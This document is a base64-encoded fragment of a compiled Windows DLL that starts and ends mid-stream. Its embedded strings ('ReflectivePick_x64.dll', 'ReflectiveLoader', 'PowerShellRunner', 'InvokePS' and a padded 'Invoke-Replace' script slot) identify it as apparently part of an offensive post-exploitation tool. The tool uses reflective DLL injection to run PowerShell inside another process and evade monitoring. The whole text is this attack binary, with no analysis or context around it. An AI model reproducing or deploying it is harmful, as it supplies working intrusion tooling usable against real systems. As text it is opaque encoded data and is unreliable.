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ABEAGUAZgBhAHUAbAB0AEQAbwBtAGEAaQBuACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGcAZQB0ACAAZABlAGYAYQB1AGwAdAAgAEEAcABwAEQAbwBtAGEAaQBuACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGwAbwBhAGQAIAB0AGgAZQAgAGEAcwBzAGUAbQBiAGwAeQAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAAAAAAAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGcAZQB0ACAAdABoAGUAIABUAHkAcABlACAAaQBuAHQAZQByAGYAYQBjAGUAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABJAG4AdgBvAGsAZQAtAFIAZQBwAGwAYQBjAGUAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAAAAAAAAAAAASQBuAHYAbwBrAGUAUABTAAAAAAAAAAAAAAAAAAAAA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m9jQWRkcmVzcwAAqwNMb2FkTGlicmFyeVcAAEtFUk5FTDMyLmRsbAAAT0xFQVVUMzIuZGxsAADOAUdldENvbW1hbmRMaW5lQQAUAkdldEN1cnJlbnRUaHJlYWRJZAAAagNJc0RlYnVnZ2VyUHJlc2VudABwA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAVgJHZXRMYXN0RXJyb3IAADwDSGVhcEZyZWUAADgDSGVhcEFsbG9jACUBRW5jb2RlUG9pbnRlcgD/AERlY29kZVBvaW50ZXIAtwRSdGxQY1RvRmlsZUhlYWRlcgBEBFJhaXNlRXhjZXB0aW9uAAApAUVudGVyQ3JpdGljYWxTZWN0aW9uAAClA0xlYXZlQ3JpdGljYWxTZWN0aW9uAAC7BFJ0bFVud2luZEV4ABkFU2V0TGFzdEVycm9yAABXAUV4aXRQcm9jZXNzAGwCR2V0TW9kdWxlSGFuZGxlRXhXAADUA011bHRpQnl0ZVRvV2lkZUNoYXIA3QVXaWRlQ2hhclRvTXVsdGlCeXRlAKkCR2V0UHJvY2Vzc0hlYXAAAMcCR2V0U3RkSGFuZGxlAABFAkdldEZpbGVUeXBlAAYBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAMUCR2V0U3RhcnR1cEluZm9XAGgCR2V0TW9kdWxlRmlsZU5hbWVBAAAwBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyABACR2V0Q3VycmVudFByb2Nlc3NJZADdAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAC4CR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAowFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwCuBFJ0bENhcHR1cmVDb250ZXh0ALUEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAvARSdGxWaXJ0dWFsVW53aW5kAACSBVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAUgVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAUQNJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AGEFU2xlZXAADwJHZXRDdXJyZW50UHJvY2VzcwBwBVRlcm1pbmF0ZVByb2Nlc3MAAIIFVGxzQWxsb2MAAIQFVGxzR2V0VmFsdWUAhQVUbHNTZXRWYWx1ZQCDBVRsc0ZyZWUAbQJHZXRNb2R1bGVIYW5kbGVXAADxBVdyaXRlRmlsZQBpAkdldE1vZHVsZUZpbGVOYW1lVwAAdQNJc1ZhbGlkQ29kZVBhZ2UAqgFHZXRBQ1AAAI0CR2V0T0VNQ1AAALkBR2V0Q1BJbmZvAKoDTG9hZExpYnJhcnlFeFcAAD8DSGVhcFJlQWxsb2MA/QNPdXRwdXREZWJ1Z1N0cmluZ1cAAJgBRmx1c2hGaWxlQnVmZmVycwAA4gFHZXRDb25zb2xlQ1AAAPQBR2V0Q29uc29sZU1vZGUAAMwCR2V0U3RyaW